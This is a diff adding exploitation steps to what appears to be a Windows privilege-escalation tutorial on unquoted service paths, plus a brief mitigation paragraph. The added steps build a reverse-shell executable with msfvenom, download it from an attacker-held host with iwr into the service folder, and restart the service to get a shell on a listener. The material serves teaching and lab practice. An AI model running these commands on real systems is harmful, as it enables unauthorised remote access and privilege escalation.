@@ -148,6 +148,50 @@ Outcome:
 
 To abuse this vulnerability you should follow these steps:
 
+1) Verify the service state:
+
+```
+sc query "Vulnerable Service 1"
+```
+
+2) Create with msfvenom a malicious exe file:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > Service.exe
+```
+
+3) Open a listener in your kali machine.
+
+4) Transfer the malicious executable in "C:\Program Files\Vulnerable Service1\":
+
+```
+iwr -Uri http://<ip>:<port>/Service.exe -Outfile "C:\Program Files\Vulnerable Service1\Service.exe"
+```
+
+5) Try to find out if you have the permission to restart the service or re-start the machine:
+
+```
+sc stop "Vulnerable Service 1"
+```
+
+and 
+
+```
+sc start "Vulnerable Service 1"
+```
+
+Outcome:
+
+![Unquoted-Service-Exploitation](/Pictures/Unquoted-Service-Exploitation.png)
+
+6) Verify the reverse shell on your Kali machine:
+
+![Unquoted-Service-Path-Reverse-Shell](/Pictures/Unquoted-Service-Path-Reverse-Shell.png)
+
+## Mitigation
+
+To defend against Unquoted Service Path vulnerabilities, adjust modify the service configuration to include proper quotation marks around the executable path. Moreover, review the permissions of service installation folder and binary file to prevent unauthorized changes.
+
 ## References
 
 - [Introduction to Windows Services applications Microsoft](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-windows-service-applications)
